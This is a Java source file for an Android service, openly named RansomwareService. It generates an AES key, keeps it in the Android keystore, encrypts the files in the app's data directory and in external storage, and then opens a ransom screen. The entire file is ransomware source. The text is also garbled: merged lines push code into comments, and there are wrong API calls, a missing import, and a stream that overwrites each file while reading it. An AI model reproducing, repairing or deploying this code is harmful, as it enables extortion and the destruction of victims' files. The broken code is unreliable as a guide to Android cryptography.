RansomwareService.java:

import android.app.Notification;import android.app.NotificationChannel;
import android.app.NotificationManager;import android.app.Service;
import android.content.Context;import android.content.Intent;
import android.os.IBinder;import android.security.KeyStore;
import android.util.Log;import android.widget.Toast;
import java.io.File;
import java.io.FileInputStream;import java.io.FileOutputStream;
import java.io.IOException;import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
public class RansomwareService extends Service {    private static final String TAG = "RansomwareService";
    private static final String CHANNEL_ID = "RansomwareChannel";
    @Override    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override    public void onCreate() {
        super.onCreate();
        // Create notification channel        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Ransomware", NotificationManager.IMPORTANCE_HIGH);
        channel.setDescription("Ransomware in progress");        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        manager.createNotificationChannel(channel);
        // Start ransomware process        new Thread(new Runnable() {
            @Override            public void run() {
                try {                    // Generate encryption key
                    KeyGenerator keyGenerator = KeyGenerator.getInstance(KeyStore.KEY_ALGORITHM_AES);                    keyGenerator.init(128);
                    SecretKey secretKey = keyGenerator.generateKey();
                    // Encrypt internal storage                    encryptInternalStorage(secretKey);
                    // Encrypt external storage
                    encryptExternalStorage(secretKey);
                    // Start RansomActivity                    Intent ransomIntent = new Intent(getApplicationContext(), RansomActivity.class);
                    ransomIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                    startActivity(ransomIntent);
                } catch (Exception e) {
                    Log.e(TAG, "Error encrypting storage", e);                }
            }        }).start();
    }
    private void encryptInternalStorage(SecretKey secretKey) throws KeyStoreException, CertificateException, NoSuchAlgorithmException, IOException, NoSuchPaddingException {
        KeyStore.SecretKeyEntry secretKeyEntry = new KeyStore.SecretKeyEntry(secretKey);        KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
        keyStore.load(null);        keyStore.setEntry("ransomware_key", secretKeyEntry, null);
        File internalStorage = getApplicationInfo().dataDir;
        File[] files = internalStorage.listFiles();        if (files != null) {
            for (File file : files) {                if (!file.isDirectory()) {
                    encryptFile(file, secretKey);                }
            }        }
    }
    private void encryptExternalStorage(SecretKey secretKey) throws KeyStoreException, CertificateException, NoSuchAlgorithmException, IOException, NoSuchPaddingException {
        File externalStorage = Environment.getExternalStorageDirectory();        File[] files = externalStorage.listFiles();
        if (files != null) {            for (File file : files) {
                if (!file.isDirectory()) {                    encryptFile(file, secretKey);
                }            }
        }    }
    private void encryptFile(File file, SecretKey secretKey) throws NoSuchAlgorithmException, NoSuchPaddingException, IOException {
        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");        cipher.init(Cipher.ENCRYPT_MODE,secretKey);
        FileInputStream inputStream = new FileInputStream(file);        byte[] iv = cipher.getIV();
        FileOutputStream outputStream = new FileOutputStream(file);        CipherOutputStream cipherOutputStream = new CipherOutputStream(outputStream, cipher);
        byte[] buffer = new byte[4096];        int bytesRead;
        while ((bytesRead = inputStream.read(buffer)) != -1) {            cipherOutputStream.write(buffer, 0, bytesRead);
        }        cipherOutputStream.write(iv);
        cipherOutputStream.close();    }
}